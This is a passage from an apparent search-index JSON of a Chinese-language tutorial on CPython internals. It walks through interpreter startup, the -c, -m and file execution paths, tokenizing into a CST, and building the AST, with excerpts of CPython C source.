\u521d\u59cb\u5316\n    pymain-&gt;err = _Py_InitializeCore(&amp;pymain-&gt;config);\n    // \u6267\u884c\u903b\u8f91\n    pymain_run_python(pymain);\n    if (Py_FinalizeEx() &lt; 0) {\n        pymain-&gt;status = 120;\n    }\ndone:\n    // \u9000\u51fa\u6e05\u7406\n    pymain_free(pymain);\n    return pymain-&gt;status;\n}\n\nstatic void pymain_run_python(_PyMain *pymain)\n{\n    PyCompilerFlags cf = {.cf_flags = 0};\n    pymain_header(pymain);\n    pymain_import_readline(pymain);\n    // \u6267\u884c\u6a21\u5f0f\u9009\u62e9\n    if (pymain-&gt;command) {\n        // \u547d\u4ee4\u884c\u6a21\u5f0f -c\n        pymain-&gt;status = pymain_run_command(pymain-&gt;command, &amp;cf);\n    }\n    else if (pymain-&gt;module) {\n        // \u6a21\u5757\u6a21\u5f0f -m\n        pymain-&gt;status = (pymain_run_module(pymain-&gt;module, 1) != 0);\n    }\n    else {\n        // \u5165\u53e3\u6587\u4ef6\u6a21\u5f0f\n        pymain_run_filename(pymain, &amp;cf);\n    }\n    pymain_repl(pymain, &amp;cf);\n}\n</code></pre></p> <p>\u8fd9\u4e2a\u6d41\u7a0b\u56fe\u80fd\u6e05\u6670\u7684\u8868\u8fbe\u51fa\u4e0a\u8ff0\u4ee3\u7801:</p> <p></p>"},{"location":"python/interpreter/#_4","title":"\u8fd0\u884c\u65f6\u73af\u5883","text":"<p>\u901a\u8fc7\u4e0a\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u65e0\u8bba\u6267\u884c\u4efb\u4f55python\u4ee3\u7801\uff0c\u8fd0\u884c\u65f6\u9996\u5148\u4f1a\u5efa\u7acb\u76f8\u5173\u73af\u5883\u3002\u8fd9\u4e2a\u73af\u5883\u5728<code>Include/cpython/initconfig.h</code>\u4e2d\u5b9a\u4e49\u4e3aPyConfig\uff0c\u8be5\u7ed3\u6784\u4f53\u4e2d\u7684\u6570\u636e\u5305\u62ec:</p> <ul> <li>\u8fd0\u884c\u6a21\u5f0f\u7684\u6807\u8bb0\uff0c\u6bd4\u5982debug\u6216optimized\u6a21\u5f0f</li> <li>\u6267\u884c\u7684\u6a21\u5f0f\uff0c\u6bd4\u5982\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u3001\u6216\u8005\u6a21\u5757\u7684\u65b9\u5f0f\u3001stdin\u7684\u65b9\u5f0f</li> <li>\u901a\u8fc7<code>-X &lt;option&gt;</code>\u9644\u52a0\u7684\u62d3\u5c55\u9009\u9879</li> <li>\u8fd0\u884c\u65f6\u8bbe\u7f6e\u7684\u73af\u5883\u53d8\u91cf</li> </ul> <p>\u8fd9\u4e9b\u503c\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4e2d\u67e5\u770b\u5230: <pre><code>[ubuntu] /tmp/missing/tt $ python3 -X dev -q -v\n&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.flags\nsys.flags(debug=0, inspect=0, interactive=0, optimize=0, dont_write_bytecode=0, no_user_site=0, no_site=0, ignore_environment=0, verbose=1, bytes_warning=0, quiet=1, hash_randomization=1, isolated=0)\n&gt;&gt;&gt; sys._xoptions\n{'dev': True}\n</code></pre></p>"},{"location":"python/interpreter/#-c","title":"-c\u7684\u65b9\u5f0f","text":"<p>\u4f8b\u5982<code>python -c \"print('hi')\"</code>\uff0c\u5b83\u7684\u8fd0\u884c\u6d41\u7a0b\u5982\u56fe\u6240\u793a:</p> <p></p> <p>pymain_run_command()\u7684\u6838\u5fc3\u903b\u8f91\u5982\u4e0b: <pre><code>// \u9996\u4e2a\u53c2\u6570\u5c31\u662f-c\u4f20\u9012\u7684\u6307\u4ee4\n// wchar_t*\u7c7b\u578b\u901a\u5e38\u662fCPython\u4e2d\u7528\u4e8e\u5b58\u50a8Unicode\u6570\u636e\u7684\u4f4e\u7ea7\u5b58\u50a8\u7c7b\u578b\uff0c\u56e0\u4e3a\u8be5\u7c7b\u578b\u7684\u5927\u5c0f\u4e5f\u53ef\u4ee5\u5b58\u50a8UTF8\u5b57\u7b26\nstatic int\npymain_run_command(wchar_t *command, PyCompilerFlags *cf)\n{\n    PyObject *unicode, *bytes;\n    // \u8f6c\u6362\u4e3aPyUnicode\u5bf9\u8c61\n    unicode = PyUnicode_FromWideChar(command, -1);\n    // \u5bf9unicode\u8fdb\u884cutf8\u7f16\u7801\u5f97\u5230\u4e00\u4e2apython\u5b57\u8282\u5bf9\u8c61\n    bytes = PyUnicode_AsUTF8String(unicode);\n    // \u91cd\u65b0\u89e3\u7801\u4e3a\u5b57\u7b26\u4e32\u4e22\u53bb\u6267\u884c\n    ret = PyRun_SimpleStringFlags(PyBytes_AsString(bytes), cf);\n    return (ret != 0);\n}\n</code></pre></p> <p>\u800cPyRun_SimpleStringFlags()\u7684\u76ee\u7684\u662f\u521b\u5efa\u4e00\u4e2aPython\u6a21\u5757<code>__main__</code>\uff0c\u548c\u4e00\u4e2a\u5b57\u5178\uff0c\u518d\u5c06\u547d\u4ee4\u4e00\u8d77\u6253\u5305\u8c03\u7528PyRun_StringFlags()\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c06\u521b\u5efa\u4e00\u4e2a\u5047\u7684\u6587\u4ef6\u540d\uff0c\u63a5\u7740\u5c31\u662f\u8c03\u7528Python\u89e3\u6790\u5668\u521b\u5efaAST\u5e76\u8fd4\u56de\u6a21\u5757mod\u4e86: <pre><code>int\nPyRun_SimpleStringFlags(const char *command, PyCompilerFlags *flags)\n{\n    PyObject *m, *d, *v;\n    // \u5efa\u7acb\u5165\u53e3\u6a21\u5757\n    m = PyImport_AddModule(\"__main__\");\n    // \u521b\u5efa\u5b57\u5178\uff0c\u7528\u4e8eglobals()\u548clocals()\n    d = PyModule_GetDict(m);\n    v = PyRun_StringFlags(command, Py_file_input, d, d, flags);\n    return 0;\n}\n\nPyObject *\nPyRun_StringFlags(const char *str, int start, PyObject *globals,\n                  PyObject *locals, PyCompilerFlags *flags)\n{\n...\n    mod = PyParser_ASTFromStringObject(str, filename, start, flags, arena);\n    ret = run_mod(mod, filename, globals, locals, flags, arena);\n    PyArena_Free(arena);\n    return ret;\n</code></pre></p>"},{"location":"python/interpreter/#-m","title":"-m\u7684\u65b9\u5f0f","text":"<p>\u53e6\u4e00\u79cd\u6267\u884cPython\u547d\u4ee4\u7684\u65b9\u5f0f\u662f-m\u9009\u9879\u548c\u6a21\u5757\u540d\u79f0\uff0c\u4f8b\u5982<code>python -m unittest</code>\u53ef\u4ee5\u8fd0\u884c\u6807\u51c6\u5e93\u4e2d\u7684unittest\u6a21\u5757\u3002\u5b9e\u9645\u4e0a\u5b83\u5c31\u662f\u5728sys.path\u4e2d\u53bb\u641c\u7d22\u540d\u4e3aunittest\u7684\u6a21\u5757\u7136\u540e\u53bb\u6267\u884c\u3002</p> <p>CPython\u662f\u5148\u901a\u8fc7\u4e00\u4e2aC\u7684API\u51fd\u6570PyImport_ImportModule(){:target=\"blank\"}\u6765\u5bfc\u5165\u6807\u51c6\u5e93<code>runpy</code>\uff0c\u5b83\u8fd4\u56de\u7684\u662f\u4e00\u4e2aPyObject\u6838\u5fc3\u5bf9\u8c61\u7c7b\u578b\uff0c\u7136\u540e\u9700\u8981\u4e00\u4e9b\u7279\u6b8a\u7684\u65b9\u6cd5\u83b7\u53d6\u5b83\u7684\u5c5e\u6027\u518d\u8c03\u7528\u3002\u4f8b\u5982<code>hi.upper()</code>\u76f8\u5f53\u4e8e<code>hi.upper.__call__()</code>\uff0c\u5728C\u4e2dPyObject_GetAttrString()\u5c31\u662f\u7528\u6765\u83b7\u5f97hi\u7684upper\u5c5e\u6027\uff0c\u7136\u540e\u901a\u8fc7PyObject_Call(){:target=\"blank\"}\u5c31\u662f\u53bb\u6267\u884c__call()\u3002</p> <p><pre><code>// modname\u5c31\u662f\u901a\u8fc7-m\u4f20\u9012\u8fdb\u6765\u7684\u53c2\u6570\nstatic int\npymain_run_module(const wchar_t *modname, int set_argv0)\n{\n    PyObject *module, *runpy, *runmodule, *runargs, *result;\n    runpy = PyImport_ImportModule(\"runpy\");\n ...\n    runmodule = PyObject_GetAttrString(runpy, \"_run_module_as_main\");\n ...\n    module = PyUnicode_FromWideChar(modname, wcslen(modname));\n ...\n    runargs = Py_BuildValue(\"(Oi)\", module, set_argv0);\n ...\n    result = PyObject_Call(runmodule, runargs, NULL);\n ...\n    if (result == NULL) {\n        return pymain_exit_err_print();\n    }\n    Py_DECREF(result);\n    return 0;\n}\n</code></pre> \u8fd9\u6bb5\u4ee3\u7801\u8bf4\u660e<code>python -m &lt;module&gt;</code>\u672c\u8d28\u4e0a\u662f<code>python -m runpy &lt;module&gt;</code>\uff0cmodule\u53ea\u662f\u53c2\u6570\uff0crunpy\u5bf9\u5176\u8fdb\u884c\u4e86\u4e00\u5c42\u5305\u88c5\u3002runpy\u662f\u7528\u7eafpython\u5199\u7684\u4f4d\u4e8e<code>Lib/runpy.py</code>\uff0c\u5b83\u7684\u76ee\u7684\u662f\u62bd\u8c61\u5728\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u5b9a\u4f4d\u548c\u6267\u884c\u6a21\u5757\u7684\u8fc7\u7a0b\uff0c\u5177\u4f53\u5e72\u8fd9\u4e9b\u4e8b:</p> <ul> <li>\u8c03\u7528\u7528\u6237\u63d0\u4f9b\u7684\u6a21\u5757\u7684<code>__import__()</code>\u65b9\u6cd5</li> <li>\u8bbe\u7f6e\u8be5\u6a21\u5757\u7684\u540d\u5b57\u7a7a\u95f4\u4e3a<code>__main__</code></li> <li>\u5728<code>__main__</code>\u7684\u540d\u5b57\u7a7a\u95f4\u4e0b\u6267\u884c\u8be5\u6a21\u5757</li> </ul> <p>runpy\u6a21\u5757\u540c\u6837\u4e5f\u53ef\u4ee5\u7528\u6765\u6267\u884c\u67d0\u4e2a\u76ee\u5f55\u6216\u8005zip\u6587\u4ef6\u3002</p>"},{"location":"python/interpreter/#file","title":"file\u7684\u65b9\u5f0f","text":"<p>\u5982\u679c\u662f<code>python test.py</code>\u8fd9\u79cd\u65b9\u5f0f\uff0cCPython\u4f1a\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u7136\u540e\u4f20\u9012\u7ed9<code>Python/pythonrun.c</code>\u4e2d\u7684PyRun_SimpleFileExFlags()\u65b9\u6cd5: <pre><code>int\nPyRun_SimpleFileExFlags(FILE *fp, const char *filename, int closeit,\n                        PyCompilerFlags *flags)\n{\n ...\n    m = PyImport_AddModule(\"__main__\");\n ...\n    // \u5982\u679c\u662fpyc\u6587\u4ef6\uff0c\u5219\u8c03\u7528run_pyc_file()\n    if (maybe_pyc_file(fp, filename, ext, closeit)) {\n ...\n        v = run_pyc_file(pyc_fp, filename, d, d, flags);\n    } else {\n        // .py\u548cstdin\u6a21\u5f0f\u90fd\u8fd0\u884cPyRun_FileExFlags()\n        if (strcmp(filename, \"&lt;stdin&gt;\") != 0 &amp;&amp;\n            set_main_loader(d, filename, \"SourceFileLoader\") &lt; 0) {\n            fprintf(stderr, \"python: failed to set __main__.__loader__\\n\");\n            ret = -1;\n            goto done;\n        }\n        v = PyRun_FileExFlags(fp, filename, Py_file_input, d, d,\n                              closeit, flags);\n    }\n ...\n    return ret;\n}\n</code></pre></p> <p>\u800cPyRun_FileExFlags()\u548c\u524d\u6587\u4ecb\u7ecd\u7684\u901a\u8fc7-c\u8f93\u5165\u7684PyRun_SimpleStringFlags()\u4f5c\u7528\u7c7b\u4f3c\uff0c\u90fd\u662f\u53bb\u521b\u5efaAST\u8fd4\u56demod\u7136\u540e\u8fd0\u884cmod: <pre><code>PyObject *\nPyRun_FileExFlags(FILE *fp, const char *filename_str, int start, PyObject *globals,\n                  PyObject *locals, int closeit, PyCompilerFlags *flags)\n{\n ...\n    mod = PyParser_ASTFromFileObject(fp, filename, NULL, start, 0, 0,\n                                     flags, NULL, arena);\n ...\n    ret = run_mod(mod, filename, globals, locals, flags, arena);\n}\n</code></pre></p> <p>run_mod()\u8d1f\u8d23\u628a\u6a21\u5757\u53d1\u9001\u7ed9AST\u7f16\u8bd1\u4e3a\u4e00\u4e2a\u4ee3\u7801\u5bf9\u8c61\uff0c\u5373\u6587\u7ae0\u5f00\u5934\u63d0\u5230\u8fc7\u7684\u5b58\u50a8\u5b57\u8282\u7801\u4ee5\u53ca\u4fdd\u5b58\u5728.pyc\u6587\u4ef6\u4e2d\u7684\u5bf9\u8c61: <pre><code>static PyObject *\nrun_mod(mod_ty mod, PyObject *filename, PyObject *globals, PyObject *locals,\n            PyCompilerFlags *flags, PyArena *arena)\n{\n    PyCodeObject *co;\n    PyObject *v;\n    co = PyAST_CompileObject(mod, filename, flags, -1, arena);\n    v = run_eval_code_obj(co, globals, locals);\n    return v;\n}\n</code></pre> \u4e4b\u540e\u7684run_eval_code_obj()\u5c31\u5c5e\u4e8e\u6267\u884c\u903b\u8f91\u4e86\uff0c\u540e\u6587\u4e2d\u518d\u63cf\u8ff0\u3002</p> <p>run_pyc_file()\u53ef\u4ee5\u7406\u89e3\u4e3a\u7701\u7565\u4e86\u521b\u5efaAST\u7684\u8fc7\u7a0b\uff0c\u800c\u662f\u901a\u8fc7marshal\u628apyc\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u590d\u5236\u5230\u5185\u5b58\u5e76\u5c06\u5176\u8f6c\u6362\u4e3a\u7279\u5b9a\u7684\u6570\u636e\u7ed3\u6784\u3002\u786c\u76d8\u4e0a\u7684pyc\u6587\u4ef6\u5c31\u662fCPython\u7f16\u8bd1\u5668\u7f13\u5b58\u5df2\u7f16\u8bd1\u4ee3\u7801\u7684\u65b9\u5f0f\uff0c\u56e0\u6b64\u65e0\u9700\u6bcf\u6b21\u8c03\u7528\u811a\u672c\u65f6\u518d\u7f16\u8bd1\u4e00\u6b21: <pre><code>static PyObject *\nrun_pyc_file(FILE *fp, const char *filename, PyObject *globals,\n             PyObject *locals, PyCompilerFlags *flags)\n{\n    PyCodeObject *co;\n    PyObject *v;\n  ...\n    v = PyMarshal_ReadLastObjectFromFile(fp);\n  ...\n    co = (PyCodeObject *)v;\n    v = run_eval_code_obj(co, globals, locals);\n    return v;\n}\n</code></pre></p>"},{"location":"python/interpreter/#_5","title":"\u7f16\u8bd1","text":""},{"location":"python/interpreter/#_6","title":"\u8bed\u4e49\u89e3\u6790","text":"<p>\u5728\u524d\u6587\u4e2d\u6211\u4eec\u4e86\u89e3\u5230\u5728\u6267\u884c\u65f6\u4f1a\u5148\u53bb\u521b\u5efaAST\uff0c\u90a3\u4e48\u8fd9\u6b65\u5177\u4f53\u662f\u600e\u4e48\u505a\u7684\u5462: <pre><code>mod_ty\nPyParser_ASTFromFileObject(FILE *fp, PyObject *filename, const char* enc,\n                           int start, const char *ps1,\n                           const char *ps2, PyCompilerFlags *flags, int *errcode,\n                           PyArena *arena)\n{\n    ...\n    node *n = PyParser_ParseFileObject(fp, filename, enc,\n                                       &amp;_PyParser_Grammar,\n                                       start, ps1, ps2, &amp;err, &amp;iflags);\n    ...\n    if (n) {\n        flags-&gt;cf_flags |= iflags &amp; PyCF_MASK;\n        mod = PyAST_FromNodeObject(n, flags, filename, arena);\n        PyNode_Free(n);\n    ...\n    return mod;\n}\n</code></pre> \u5728PyParser_ASTFromFileObject()\u65b9\u6cd5\u4e2d\uff0c\u4f1a\u5c06\u6587\u4ef6\u53e5\u67c4\u3001\u7f16\u8bd1\u5668\u6807\u5fd7\u3001\u4ee5\u53ca\u5185\u5b58\u5757\u5bf9\u8c61\u6253\u5305\u7ed9PyParser_ParseFileObject()\u8f6c\u6362\u4e3a\u4e00\u4e2anode\u5bf9\u8c61: <pre><code>node *\nPyParser_ParseFileObject(FILE *fp, PyObject *filename,\n                         const char *enc, grammar *g, int start,\n                         const char *ps1, const char *ps2,\n                         perrdetail *err_ret, int *flags)\n{\n    struct tok_state *tok;\n...\n    if ((tok = PyTokenizer_FromFile(fp, enc, ps1, ps2)) == NULL) {\n        err_ret-&gt;error = E_NOMEM;\n        return NULL;\n    }\n...\n    return parsetok(tok, g, start, err_ret, flags);\n}\n</code></pre> \u8be5\u65b9\u6cd5\u628a\u4e24\u9879\u91cd\u8981\u7684\u4efb\u52a1\u7ec4\u5408\u4e86\u8d77\u6765\uff0c\u4e00\u662f\u4f7f\u7528PyTokenizer_FromFile()\u5b9e\u4f8b\u5316\u4e00\u4e2atok_state\uff0ctok_state\u4e5f\u53ea\u662f\u4e00\u4e2a\u6570\u636e\u7ed3\u6784(\u5bb9\u5668)\uff0c\u5b58\u50a8\u7531tokenizer\u751f\u6210\u7684\u4e34\u65f6\u6570\u636e\uff1b\u4e8c\u662f\u4f7f\u7528parsetok()\u5c06token\u8f6c\u6362\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u89e3\u6790\u6811(\u8282\u70b9\u5217\u8868)\u3002</p> <p>\u5728parsetok()\u4e2d\uff0c\u5c06\u5faa\u73af\u8c03\u7528tok_get()\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u50cf\u662f\u4e00\u4e2a\u8fed\u4ee3\u5668\uff0c\u4e0d\u65ad\u83b7\u53d6\u89e3\u6790\u6811\u7684\u4e0b\u4e00\u4e2atoken\uff0cparsetok()\u5728\u6839\u636e\u4e0d\u540ctoken\u8bbe\u7f6etok_state\u4e2d\u76f8\u5173\u7684\u503c\u3002\u5b83\u4e5f\u662fCPython\u4e2d\u6700\u590d\u6742\u7684\u65b9\u6cd5\u4e4b\u4e00\uff0c\u56e0\u4e3a\u8981\u517c\u5bb9\u5404\u79cd\u5404\u6837\u7684\u8fb9\u7f18\u60c5\u51b5\u3001\u6570\u5341\u5e74\u7684\u5386\u53f2\u539f\u56e0\u3001\u65b0\u7684\u8bed\u8a00\u7279\u6027\u7b49\u7b49\u539f\u56e0\u3002\u6211\u4eec\u6765\u770b\u5176\u4e2d\u4e00\u79cd\u7b80\u5355\u7684\u89e3\u6790\uff0c\u5982\u4f55\u628a\u6bcf\u884c\u7ed3\u5c3e\u53d8\u4e3atoken<code>NEWLINE</code>\u7684: <pre><code>static int\ntok_get(struct tok_state *tok, char **p_start, char **p_end)\n{\n...\n    /* Newline */\n    if (c == '\\n') {\n        tok-&gt;atbol = 1;\n        if (blankline || tok-&gt;level &gt; 0) {\n            goto nextline;\n        }\n        *p_start = tok-&gt;start;\n        *p_end = tok-&gt;cur - 1; /* Leave '\\n' out of the string */\n        tok-&gt;cont_line = 0;\n        if (tok-&gt;async_def) {\n            /* We're somewhere inside an 'async def' function, and\n               we've encountered a NEWLINE after its signature. */\n            tok-&gt;async_def_nl = 1;\n        }\n        return NEWLINE;\n    }\n...\n}\n</code></pre> parsetok()\u8fd4\u56de\u7684\u662f\u4e00\u4e2anode\u8282\u70b9\u7c7b\u578b: <pre><code>typedef struct _node {\n    short               n_type;\n    char                *n_str;\n    int                 n_lineno;\n    int                 n_col_offset;\n    int                 n_nchildren;\n    struct _node        *n_child;\n    int                 n_end_lineno;\n    int                 n_end_col_offset;\n} node;\n</code></pre> \u8fd9\u4e9b\u4e2a\u8282\u70b9\u7ec4\u6210\u7684\u6811\u6211\u4eec\u53ebCST\uff0c\u6bcf\u4e2a\u8282\u70b9\u5305\u542b\u4e86\u8bed\u6cd5\u3001tokenID\u3001\u7b26\u53f7\uff0c\u4f46\u8fd9\u4e2a\u6811\u4e0d\u80fd\u7528\u4e8e\u7f16\u8bd1\u5668\u505a\u51fa\u5feb\u901f\u51b3\u7b56\uff0c\u7f16\u8bd1\u5668\u9700\u8981\u66f4\u9ad8\u4e00\u7ea7\u62bd\u8c61\u5373AST\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5185\u90e8\u7684API\u89c2\u5bdf\u5230CST\u7684\u8f93\u51fa\u7ed3\u679c: <pre><code>import symbol\nimport token\nimport parser\n\n# \u4e3a\u4e86\u8f93\u51fa\u7ed3\u679c\u7684\u53ef\u8bfb\u6027\uff0c\u505a\u4e86\u4e00\u5c42\u5904\u7406\ndef lex(expression):\n    symbols = {v: k for k, v in symbol.__dict__.items() if isinstance(v, int)}\n    tokens = {v: k for k, v in token.__dict__.items() if isinstance(v, int)}\n    lexicon = {**symbols, **tokens}\n    st = parser.expr(expression)\n    st_list = parser.st2list(st)\n    def replace(l: list):\n        r = []\n        for i in l:\n            if isinstance(i, list):\n                r.append(replace(i))\n            else:\n                if i in lexicon:\n                    r.append(lexicon[i])\n                else:\n                    r.append(i)\n        return r\n    return replace(st_list)\n\n# \u5c0f\u5199\u7684\u5c31\u662f\u7b26\u53f7\uff0c\u5927\u5199\u7684\u5c31\u662ftoken\n&gt;&gt;&gt; pprint(lex('a + 1'))\n['eval_input',\n ['testlist',\n  ['test',\n   ['or_test',\n    ['and_test',\n     ['not_test',\n      ['comparison',\n       ['expr',\n        ['xor_expr',\n         ['and_expr',\n          ['shift_expr',\n           ['arith_expr',\n            ['term',\n             ['factor', ['power', ['atom_expr', ['atom', ['NAME', 'a']]]]]],\n            ['PLUS', '+'],\n            ['term',\n             ['factor',\n              ['power', ['atom_expr', ['atom', ['NUMBER', '1']]]]]]]]]]]]]]]]],\n ['NEWLINE', ''],\n ['ENDMARKER', '']]\n</code></pre></p>"},{"location":"python/interpreter/#ast","title":"AST","text":"<p>CPython\u7684\u4e0b\u4e00\u4e2a\u9636\u6bb5\u5c31\u662f\u5c06CST\u8f6c\u6362\u4e3a\u80fd\u591f\u6267\u884c\u7684\u3001\u66f4\u6709\u903b\u8f91\u7684\u4e1c\u897f\uff0c\u4e5f\u5c31\u662fAST(Abstract Syntax Trees\uff0c\u62bd\u8c61\u8bed\u6cd5\u6811)\u3002\u867d\u7136\u8fd9\u4e00\u6b65\u662f\u89e3\u91ca\u5668\u5185\u8054\u751f\u6210\uff0c\u6211\u4eec\u4e5f\u6709\u5176\u4ed6\u529e\u6cd5\u80fd\u65b9\u4fbf\u7684\u89c2\u5bdf\u5230\uff0c\u4f8b\u5982\u4f7f\u7528<code>instaviz</code>\u5e93\uff0c\u5b83\u80fd\u5728\u4e00\u4e2a\u7f51\u9875\u4e2d\u5c55\u793aAST\u4ee5\u53ca\u6bcf\u4e2a\u8282\u70b9\u7684\u5c5e\u6027: <pre><code>&gt;&gt;&gt; import instaviz\n&gt;&gt;&gt; def example():\n       a = 1\n       b = a + 1\n       return b\n&gt;&gt;&gt; instaviz.show(example)\n</code></pre> \u6211\u4eec\u80fd\u770b\u5230\u8fd9\u6837\u7684\u754c\u9762: </p> <p>\u7136\u540e\u53ef\u4ee5\u70b9\u51fbAST\u4e2d\u7684\u8282\u70b9:  \u4f8b\u5982\u5982\u679c\u70b9\u51fb\u56fe\u4e2d\u7684Assign\u8282\u70b9\uff0c\u5b83\u4ee3\u8868\u7684\u662f<code>b=a+1</code>\u8fd9\u4e00\u884c\uff0c\u53f3\u4fa7\u4f1a\u5c55\u793a\u51fa\u8fd9\u4e2a\u8282\u70b9\u7684\u5c5e\u6027\uff0c\u5b83\u6709\u4e24\u4e2a\u5c5e\u6027\uff0c\u4e00\u4e2a\u662ftargets\uff0c\u4ee3\u8868\u53d8\u91cf\u540d\u79f0\uff0c\u5b83\u6709\u65f6\u53ef\u80fd\u662f\u4e00\u4e2a\u5217\u8868\uff0c\u56e0\u4e3a\u89e3\u5305\u64cd\u4f5c\u5c31\u4f1a\u6709\u591a\u4e2a\u53d8\u91cf\uff1b\u53e6\u4e00\u4e2a\u662fvalue\uff0c\u4ee3\u8868\u53d8\u91cf\u7684\u503c\uff0c\u5728\u8fd9\u91cc\u5c31\u662f<code>a+1</code>\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u6211\u4eec\u518d\u70b9\u51fbBinOp\u8282\u70b9\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u5b83\u76843\u4e2a\u5c5e\u6027\uff0cleft\u8868\u793a\u8fd0\u7b97\u7b26\u5de6\u8fb9\u662f\u4ec0\u4e48\uff0cop\u8868\u793a\u8fd0\u7b97\u7b26\uff0cright\u8868\u793a\u8fd0\u7b97\u7b26\u53f3\u8fb9\u3002</p> <p>\u7528C\u8bed\u8a00\u7f16\u8bd1AST\u5e76\u4e0d\u662f\u4e00\u4ef6\u5bb9\u6613\u7684\u4e8b\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a\u771f\u6b63\u7684\u7f16\u8bd1\u6a21\u5757\u67095000\u884c\u4ee3\u7801\uff0c\u5728<code>Python/ast.c</code>\u4e2d\u3002</p> <p>\u5177\u4f53\u5230\u6838\u5fc3\u4ee3\u7801\u6d41\u7a0b\u6765\u8bf4\uff0c\u4e4b\u524d\u901a\u8fc7PyParser_ParseFileObject()\u5f97\u5230\u7684CST\u5bf9\u8c61node\uff0c\u63a5\u7740\u4f20\u5165PyAST_FromNodeObject()\uff0c\u5e76\u9644\u5e26\u6587\u4ef6\u540d\u3001\u7f16\u8bd1flag\u548cPyArena\u3002\u5f97\u5230\u51fd\u6570\u8fd4\u56de\u7684mod_ty\uff0c\u662f\u4e00\u4e2a\u5bb9\u5668\u7ed3\u6784\uff0c\u5c5e\u4e8ePython5\u79cd\u6a21\u5757\u7c7b\u578b\u4e4b\u4e00:Module\u3001Interactive\u3001Expression\u3001FunctionType\u3001Suite\u3002\u5728<code>Include/Python-ast.h</code>\u4e2d\u80fd\u770b\u5230\u6bcf\u79cd\u7c7b\u578b\u9700\u8981\u7684\u5b57\u6bb5: <pre><code>enum _mod_kind {Module_kind=1, Interactive_kind=2, Expression_kind=3,\n                 FunctionType_kind=4, Suite_kind=5};\nstruct _mod {\n    enum _mod_kind kind;\n    union {\n        struct {\n            asdl_seq *body;\n            asdl_seq *type_ignores;\n        } Module;\n        struct {\n            asdl_seq *body;\n        } Interactive;\n        struct {\n            expr_ty body;\n        } Expression;\n        struct {\n            asdl_seq *argtypes;\n            expr_ty returns;\n        } FunctionType;\n        struct {\n            asdl_seq *body;\n        } Suite;\n    } v;\n};\n</code></pre> \u9664\u4e86\u6a21\u5757\u7c7b\u578b\uff0c\u5176\u4ed6\u7684AST\u7c7b\u578b\u90fd\u5217\u5728<code>Parser/Python.asdl</code>\u4e2d\uff0c\u5305\u62ecstatement\u3001expression\u3001operators\u3001comprehensions\u7b49\u7b49\u3002\u5728\u8be5\u6587\u4ef6\u4e2d\u6211\u4eec\u80fd\u770b\u5230\u7c7b\u578b\u5b57\u6bb5\u7684\u5b9a\u4e49\u4e5f\u662f\u7528\u5728\u8fd9\u91cc\u7684: <pre><code>-- ASDL's 5 builtin types are:\n-- identifier, int, string, object, constant\n\nmodule Python\n{\n    mod = Module(stmt* body, type_ignore *type_ignores)\n        | Interactive(stmt* body)\n        | Expression(expr body)\n        | FunctionType(expr* argtypes, expr returns)\n</code></pre></p> <p>\u63a5\u7740\uff0cPyAST_FromNodeObject()\u4f7f\u7528TYPE(n)\u786e\u5b9a\u9996\u4e2aCST\u8282\u70b9\u7684\u7c7b\u578b\u6765\u6267\u884c\u4e0d\u540c\u7684\u903b\u8f91\uff0c\u5982\u679c\u662f\u6587\u4ef6\u8f93\u5165\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u662fModule\uff0ceval_input\u5c31\u662fExpression\uff0c\u603b\u4e4b\u662fModule, Interactive, Expression, FunctionType\u4e2d\u7684\u4e00\u79cd: <pre><code>mod_ty\nPyAST_FromNodeObject(const node *n, PyCompilerFlags *flags,\n                     PyObject *filename, PyArena *arena)\n{\n    ...\n    switch (TYPE(n)) {\n        case file_input:\n            stmts = _Py_asdl_seq_new(num_stmts(n), arena);\n            for (i = 0; i &lt; NCH(n) - 1; i++) {\n                ch = CHILD(n, i);\n                if (TYPE(ch) == NEWLINE)\n                    continue;\n                num = num_stmts(ch);\n                if (num == 1) {\n                    s = ast_for_stmt(&amp;c, ch);\n                }\n                else {\n                    ch = CHILD(ch, 0);\n                    REQ(ch, simple_stmt);\n                    for (j = 0; j &lt; num; j++) {\n                        s = ast_for_stmt(&amp;c, CHILD(ch, j * 2));\n                    }\n                }\n            }\n            /* Type ignores are stored under the ENDMARKER in file_input. */\n            ...\n            res = Module(stmts, type_ignores, arena);\n            break;\n        case eval_input: {\n            expr_ty testlist_ast;\n            testlist_ast = ast_for_testlist(&amp;c, CHILD(n, 0));\n            res = Expression(testlist_ast, arena);\n            break;\n        }\n        case single_input:\n            ...\n            break;\n        case func_type_input:\n            ...\n        ...\n    return res;\n}\n</code></pre></p> <p>\u904d\u5386\u5b69\u5b50\u8282\u70b9\u5e76\u521b\u5efa\u76f8\u5e94\u7684AST\u8bed\u53e5\u8282\u70b9\u903b\u8f91\u5728ast_for_stmt(){:target=\"blank\"}\u4e2d\uff0c\u8be5\u51fd\u6570\u5185\u8fd8\u9700\u8981\u518d\u6839\u636e\u4e0d\u540c\u7684\u8bed\u53e5\u7c7b\u578b\u8c03\u7528\u4e0d\u540c\u7684\u51fd\u6570\u521b\u5efa\u8282\u70b9\uff0c\u90fd\u662f\u7c7b\u4f3c\u4e8east_for*()\uff0c\u4f8b\u5982<code>2**4</code>\u8fd9\u6837\u7684\u8bed\u53e5\u6700\u7ec8\u80fd\u627e\u5230ast_for_power()\u8fd9\u6837\u7684\u65b9\u6cd5\u3002</p>"},{"location":"python/interpreter/#_7","title":"\u7f16\u8bd1\u8fc7\u7a0b","text":"<p>\u73b0\u5728\u89e3\u91ca\u5668\u6709\u4e86AST\uff0c\u4e5f\u5c31\u6709\u4e86\u6bcf\u4e2a\u64cd\u4f5c\u3001\u51fd\u6570\u3001\u7c7b\u548c\u540d\u5b57\u7a7a\u95f4\u6240\u9700\u8981\u7684\u5c5e\u602